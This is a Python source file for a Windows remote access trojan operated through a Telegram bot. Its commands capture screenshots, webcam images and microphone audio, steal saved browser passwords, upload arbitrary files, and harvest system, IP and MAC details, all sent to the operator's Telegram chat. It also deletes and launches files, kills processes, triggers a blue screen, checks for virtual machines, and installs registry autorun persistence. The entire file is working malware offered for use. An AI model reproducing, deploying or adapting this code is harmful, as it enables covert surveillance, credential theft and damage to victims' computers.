# -*- coding: utf-8 -*-
import telebot
import hackpy
import requests
import socket
from subprocess import Popen, PIPE
import bs4 
import time
from getmac import get_mac_address
import pyautogui
import easygui
import pyttsx3
import webbrowser
from PIL import ImageGrab
import os 
from hackpy.passwords import passwordsRecovery
from hackpy.passwords import getenv
from hackpy.passwords import copy2
from hackpy.passwords import CryptUnprotectData
from hackpy.passwords import path
from hackpy.passwords import sql_connect
from email.message import EmailMessage
bot = telebot.TeleBot('token')

chat_id =  00000 #change chat id
bot_token = 'token'


bot.send_message(chat_id, "RAT START!")
	


	
	
filemanager = hackpy.file


def desktopscreen():
	screen = ImageGrab.grab() 


	screen.save(os.getenv("APPDATA") + '\\desktop.png') 
	screen = open(os.getenv("APPDATA") + '\\desktop.png', 'rb') 
	files = {'photo': screen} 
	requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + str(chat_id) , files=files) 


def sentphoto():
		hackpy.webcamScreenshot(filename = 'screenshot.png', delay = 4500, camera = 1)
	

		
		bot.send_photo(chat_id, open('screenshot.png', 'rb'))


@bot.message_handler(commands=['webcam'])
def start_message3(message):
	bot.send_message(chat_id, "wait...")
	sentphoto()


@bot.message_handler(commands=['screen'])
def start_message4(message):
	bot.send_message(chat_id, "wait...")
	desktopscreen()


@bot.message_handler(commands=['steal'])
def start_message6(message):   
	for key, account in passwordsRecovery():
		bot.send_message(message.chat.id, 'result' + 
			'\n['  + str(key) + ']'
			'\n |____ SITE: ' + account['url'] + 
			'\n |____ USER: ' + account['login'] + 
			'\n |____ PASS: ' + account['password'])
			

@bot.message_handler(commands=['info'])
def start_message2(message):
	eth_mac = get_mac_address(interface="eth0")
	win_mac = get_mac_address(interface="Ethernet 3")
	ip_mac = get_mac_address(ip="192.168.0.1")
	ip6_mac = get_mac_address(ip6="::1")
	host_mac = get_mac_address(hostname="localhost")
	updated_mac = get_mac_address(ip="10.0.0.1", network_request=True)

	s = requests.get('https://2ip.ua/ru/')

	b = bs4.BeautifulSoup(s.text, "html.parser")

	a = b.select(" .ipblockgradient .ip")[0].getText()
	bot.send_message(message.chat.id, '\nInfo:' +
	'\nUsername: '     + hackpy.userInfo()      +
	'\nVersion: '      + hackpy.versionInfo()   +
	'\nRelease: '      + hackpy.releaseInfo()   +
	'\nSystem: '       + hackpy.systemInfo()    +
	'\nNode: '         + hackpy.nodeInfo()      +
	'\nMachine: '      + hackpy.machineInfo()   +
	'\nProcessor: '    + hackpy.processorInfo() +
	'\nPlatform: '     + hackpy.platformInfo()  +
	'\nArchitecture: ' + hackpy.architecture()  +
	'\nIP :' +  (a) +
	'\neth_mac:' + str(eth_mac) +
	'\nwin_mac:' + str(win_mac) +
	'\nip_mac:' + str(ip_mac) +
	'\nip6_mac:' + str(ip6_mac) +
	'\nhost_mac' + str(host_mac) +
	'\nupdated_mac' + str(updated_mac))


	



	

@bot.message_handler(commands=['message'])
def start_message44(message):
	messagenewsss = "{0}".format(message.text)
	 


	
	
	messagef = messagenewsss.split(" ", maxsplit=1)[1]
	 
	easygui.msgbox((messagef), title="message")	
 
	
	

	
@bot.message_handler(commands=['cursor'])
def start_message9(message):
	bot.send_message(chat_id, "start")
	pyautogui.dragTo(200,400, duration=0.6)
	

	
@bot.message_handler(commands=['degrees'])
def start_message10(message):
	bot.send_message(chat_id, "start")
	for i in range(0,5+1):
		i+1
		for degrees in (90, 180, 270, 0):
			hackpy.rotateScreen(degrees)
			time.sleep(0.10)
	

@bot.message_handler(commands=['bsod'])
def start_message11(message):
	bot.send_message(chat_id, "bsod!")
	hackpy.bsod()

	
@bot.message_handler(commands=['help'])
def start_message12(message):
	bot.send_message(message.chat.id, '\nwebcam\nscreen\nsteal\ninfo\ndegrees\nbsod\nhelp\ncursor\ndirect\nwebopen\nremovefile\nstartfile\nscanfile\nstartfileasad\ncd\nkillprocc\naudio\nmessage\ncheckvm')
	
		

@bot.message_handler(commands=['direct']) 
def directcheck(command):
	directoryb = os.path.abspath(os.getcwd())
	bot.send_message(chat_id, "Direct: \n" + (str(directoryb)))


@bot.message_handler(commands=['webopen']) 
def webopen(message):
	try:
		link = "{0}".format(message.text)
		urlres = link.split(" ", maxsplit=1)[1]
		webbrowser.open(urlres)
		bot.send_message(chat_id, "open!")
	except:
		bot.send_message(chat_id, "error!")
 	
	

	
@bot.message_handler(commands=['removefile'])
def filecontrol(message):
	texts = "{0}".format(message.text)
	
	textress = texts.split(" ", maxsplit=1)[1]
	filemanager.remove(textress)
	bot.send_message(chat_id, "file remove")



  
@bot.message_handler(commands=["cd"])
def cddir(message):
	try:
		user_msg = "{0}".format(message.text)  
		folder = user_msg.split(" ", maxsplit=1)[1]
		os.chdir(folder)
		bot.send_message(chat_id, "Directory change   on " + folder)
	except:
	 	bot.send_message(chat_id, "Error")
	 
	
	
@bot.message_handler(commands=['startfile'])
def filecontrol3(message):
	textsss = "{0}".format(message.text)
	
	textressss = textsss.split(" ", maxsplit=1)[1]
	filemanager.start(textressss)

@bot.message_handler(commands=['checkvm'])
def vmcheck(message):
	if hackpy.inSandBox() or hackpy.inVirtualBox():  
		bot.send_message(chat_id, 'running in a virtual machine') 
		
	else:
		bot.send_message(chat_id, 'no virtual machine detected')


@bot.message_handler(commands=["scanfile"]) 
def checkfile(commands):
 try:
	 dirs = '\n'.join(os.listdir(path="."))
	 bot.send_message(chat_id, "Files: " + "\n" + dirs)
 except:
	 bot.send_message(chat_id, "error")

@bot.message_handler(commands=["killprocc"]) 
def killprocc(message):
	textssss = "{0}".format(message.text)
	
	textresssss = textssss.split(" ")[1]
	
	os.system("C:\\Windows\\System32\\TASKKILL.exe /F /IM" + "  " +  (  textresssss))
	bot.send_message(chat_id, "Kill")
	

	 
	
@bot.message_handler(commands=["audio"])
def audiorec(message):	
	hackpy.recordAudio(filename = 'recording.wav', time = 20)	
	
	bot.send_audio(chat_id=chat_id, audio=open('recording.wav', 'rb'))
	

@bot.message_handler(commands=["save"])
def savefile(message):
	textsssss = "{0}".format(message.text)
	textresssssss = textsssss.split(" ", maxsplit=1)[1]
	
	 
	
	
	 
	 
	fileforsave = open(textresssssss, 'rb')
	bot.send_document(chat_id, fileforsave)
	 

	


	

hackpy.autorun('%APPDATA%//name.exe').installRegistry()
hackpy.autorun('name.exe').installRegistry()







bot.polling()